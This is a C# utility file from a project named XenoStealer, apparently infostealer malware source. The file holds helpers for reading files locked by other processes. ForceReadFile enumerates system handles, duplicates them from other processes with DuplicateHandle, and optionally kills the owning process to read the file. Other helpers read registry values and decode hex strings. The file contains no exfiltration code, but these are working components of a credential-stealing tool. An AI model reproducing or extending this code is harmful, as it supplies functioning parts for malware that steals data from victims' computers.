using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using System.Threading.Tasks;
using static XenoStealer.InternalStructs;

namespace XenoStealer
{
    public static class Utils
    {

        private static RegistryView[] registryViews = new RegistryView[] { RegistryView.Registry64, RegistryView.Registry32 };

        public static string ForceReadFileString(string filePath, bool killOwningProcessIfCouldntAquire = false)
        {
            byte[] fileContent = ForceReadFile(filePath, killOwningProcessIfCouldntAquire);
            if (fileContent == null) 
            {
                return null;
            }
            try 
            {
                return Encoding.UTF8.GetString(fileContent);
            } 
            catch 
            { 
            }
            return null;
        }

        public static byte[] ForceReadFile(string filePath, bool killOwningProcessIfCouldntAquire=false)
        {
            try 
            { 
                return File.ReadAllBytes(filePath);
            } 
            catch (Exception e)//make it check the exact error name
            {
                if (!e.Message.ToLower().Contains("used by another process")) 
                {
                    return null;
                }
            }

            bool Pidless = false;

            if (!GetProcessLockingFile(filePath, out int[] process)) 
            {
                Pidless = true;
            }

            uint dwSize = 0;
            uint status = 0;
            uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;


            int HandleStructSize = Marshal.SizeOf(typeof(InternalStructs.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));

            IntPtr pInfo = Marshal.AllocHGlobal(HandleStructSize);
            do
            {
                status = NativeMethods.NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation, pInfo, dwSize, out dwSize);
                if (status == STATUS_INFO_LENGTH_MISMATCH)
                {
                    pInfo = Marshal.ReAllocHGlobal(pInfo, (IntPtr)dwSize);
                }
            } while (status != 0);


            //ULONG_PTR NumberOfHandles;
            //ULONG_PTR Reserved;
            //SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];

            IntPtr pInfoBackup = pInfo;

            ulong NumOfHandles =(ulong)Marshal.ReadIntPtr(pInfo);

            pInfo += 2 * IntPtr.Size;//skip past the number of handles and the reserved and start at the handles.

            byte[] result = null;

            for (ulong i = 0; i < NumOfHandles; i++) 
            {
                InternalStructs.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX HandleInfo = Marshal.PtrToStructure<InternalStructs.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>(pInfo+(int)(i * (uint)HandleStructSize));

                if (!Pidless && !process.Contains((int)(uint)HandleInfo.UniqueProcessId)) 
                {
                    continue;
                }


                if (DupHandle((int)HandleInfo.UniqueProcessId, (IntPtr)(ulong)HandleInfo.HandleValue, out IntPtr duppedHandle)) 
                {
                    if (NativeMethods.GetFileType(duppedHandle) != FileType.FILE_TYPE_DISK) 
                    {
                        NativeMethods.CloseHandle(duppedHandle);
                        continue;
                    }

                    string name=GetPathFromHandle(duppedHandle);

                    if (name == null) 
                    {
                        NativeMethods.CloseHandle(duppedHandle);
                        continue;
                    }

                    if (name.StartsWith("\\\\?\\")) 
                    {
                        name=name.Substring(4);
                    }

                    if (name == filePath) 
                    {
                        result = ReadFileBytesFromHandle(duppedHandle);
                        NativeMethods.CloseHandle(duppedHandle);
                        if (result != null) 
                        {
                            break;
                        }
                    }

                    NativeMethods.CloseHandle(duppedHandle);

                }

                
            }
            Marshal.FreeHGlobal(pInfoBackup);

            if (result == null && killOwningProcessIfCouldntAquire) 
            {
                foreach (int i in process) 
                {
                    KillProcess(i);
                }

                try
                {
                    result=File.ReadAllBytes(filePath);
                }
                catch 
                { 
                }

            }

            return result;
        }

        public static string GetPathFromHandle(IntPtr file)
        {
            uint FILE_NAME_NORMALIZED = 0x0;

            StringBuilder FileNameBuilder = new StringBuilder(32767 + 2);//+2 for a possible null byte?
            uint pathLen = NativeMethods.GetFinalPathNameByHandleW(file, FileNameBuilder, (uint)FileNameBuilder.Capacity, FILE_NAME_NORMALIZED);
            if (pathLen == 0)
            {
                return null;
            }
            string FileName = FileNameBuilder.ToString(0, (int)pathLen);
            return FileName;
        }

        public static bool DupHandle(int sourceProc, IntPtr sourceHandle, out IntPtr newHandle)
        {
            newHandle = IntPtr.Zero;
            uint PROCESS_DUP_HANDLE = 0x0040;
            uint DUPLICATE_SAME_ACCESS = 0x00000002;
            IntPtr procHandle = NativeMethods.OpenProcess(PROCESS_DUP_HANDLE, false, (uint)sourceProc);
            if (procHandle == IntPtr.Zero)
            {
                return false;
            }

            IntPtr targetHandle = IntPtr.Zero;

            if (!NativeMethods.DuplicateHandle(procHandle, sourceHandle, NativeMethods.GetCurrentProcess(), ref targetHandle, 0, false, DUPLICATE_SAME_ACCESS))
            {
                NativeMethods.CloseHandle(procHandle);
                return false;

            }
            newHandle = targetHandle;
            NativeMethods.CloseHandle(procHandle);
            return true;
        }

        public static bool GetProcessLockingFile(string filePath, out int[] process) 
        {
            process = null;
            uint ERROR_MORE_DATA = 0xEA;

            string key = Guid.NewGuid().ToString();
            if (NativeMethods.RmStartSession(out uint SessionHandle, 0, key) != 0) 
            {
                return false;
            }

            string[] resourcesToCheckAgaist = new string[] { filePath };
            if (NativeMethods.RmRegisterResources(SessionHandle, (uint)resourcesToCheckAgaist.Length, resourcesToCheckAgaist, 0, null, 0, null) != 0) 
            { 
                NativeMethods.RmEndSession(SessionHandle);
                return false;
            }

            

            while (true) 
            {
                uint nProcInfo = 0;
                uint status=NativeMethods.RmGetList(SessionHandle, out uint nProcInfoNeeded, ref nProcInfo, null, out RM_REBOOT_REASON RebootReasions);
                if (status != ERROR_MORE_DATA) 
                {
                    NativeMethods.RmEndSession(SessionHandle);
                    process = new int[0];
                    return true;
                }
                uint oldnProcInfoNeeded = nProcInfoNeeded;
                RM_PROCESS_INFO[] AffectedApps = new RM_PROCESS_INFO[nProcInfoNeeded];
                nProcInfo = nProcInfoNeeded;
                status = NativeMethods.RmGetList(SessionHandle, out nProcInfoNeeded, ref nProcInfo, AffectedApps, out RebootReasions);
                if (status == 0) 
                {
                    process = new int[AffectedApps.Length];
                    for (int i = 0;i<AffectedApps.Length;i++) 
                    {
                        process[i] = (int)AffectedApps[i].Process.dwProcessId;
                    }
                    break;
                }
                if (oldnProcInfoNeeded != nProcInfoNeeded)
                {
                    continue;
                }
                else 
                {
                    NativeMethods.RmEndSession(SessionHandle);
                    return false;
                }
            }
            NativeMethods.RmEndSession(SessionHandle);
            return true;
        }

        public static byte[] ReadFileBytesFromHandle(IntPtr handle) 
        {
            uint PAGE_READONLY = 0x02;
            uint FILE_MAP_READ = 0x04;
            IntPtr fileMapping = NativeMethods.CreateFileMappingA(handle, IntPtr.Zero, PAGE_READONLY, 0, 0, null);
            if (fileMapping == IntPtr.Zero) 
            {
                return null;
            }

            if (!NativeMethods.GetFileSizeEx(handle, out ulong fileSize)) 
            {
                NativeMethods.CloseHandle(fileMapping);
                return null;
            }

            IntPtr BaseAddress = NativeMethods.MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, (UIntPtr)fileSize);
            if (BaseAddress == IntPtr.Zero) 
            {
                NativeMethods.CloseHandle(fileMapping);
                return null;
            }

            byte[] FileData = new byte[fileSize];

            Marshal.Copy(BaseAddress, FileData, 0, (int)fileSize);

            NativeMethods.UnmapViewOfFile(BaseAddress);
            NativeMethods.CloseHandle(fileMapping);

            return FileData;
        }

        public static bool KillProcess(int pid, uint exitcode=0) 
        {
            uint PROCESS_TERMINATE = 0x0001;
            IntPtr ProcessHandle=NativeMethods.OpenProcess(PROCESS_TERMINATE, false, (uint)pid);
            if (ProcessHandle == IntPtr.Zero) 
            {  
                return false; 
            }

            bool result = NativeMethods.TerminateProcess(ProcessHandle, exitcode);
            NativeMethods.CloseHandle(ProcessHandle);
            return result;
        }

        public static bool CompareByteArrays(byte[] b1, byte[] b2) 
        {
            if (b1 == null || b2 == null) 
            {
                return b1 == b2;
            }
            if (b1.Length != b2.Length) 
            {
                return false;
            }
            return NativeMethods.memcmp(b1, b2, (UIntPtr)b1.Length) == 0;
        }

        public static string ReverseString(string str)
        {
            char[] charArray = str.ToCharArray();
            Array.Reverse(charArray);
            return new string(charArray);
        }

        public static object ReadRegistryKeyValue(RegistryHive hive, string location, string value)
        {
            foreach (RegistryView view in registryViews) 
            {
                if (view == RegistryView.Registry64 && !Environment.Is64BitOperatingSystem) 
                {
                    continue;
                }
                RegistryKey hiveKey = null;
                RegistryKey keyData = null;
                try
                {
                    hiveKey = RegistryKey.OpenBaseKey(hive, view);
                    if (hiveKey == null)
                    {
                        continue;
                    }
                    keyData = hiveKey.OpenSubKey(location);
                    if (keyData == null)
                    {
                        hiveKey.Dispose();
                        continue;
                    }
                    object data = keyData.GetValue(value);
                    if (data == null)
                    {
                        hiveKey.Dispose();
                        keyData.Dispose();
                        continue;
                    }
                    return data;
                }
                catch 
                {
                    
                }
                finally
                {
                    hiveKey?.Dispose();
                    keyData?.Dispose();
                }
            }
            return null;
        }

        public static byte[] ConvertHexStringToByteArray(string hexString)
        {
            if (hexString.Length % 2 != 0)
            {
                return null;
            }

            byte[] data = new byte[hexString.Length / 2];
            for (int index = 0; index < data.Length; index++)
            {
                string byteValue = hexString.Substring(index * 2, 2);//*2 as its 2 chars per byte
                data[index] = byte.Parse(byteValue, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
            }

            return data;
        }

    }
}
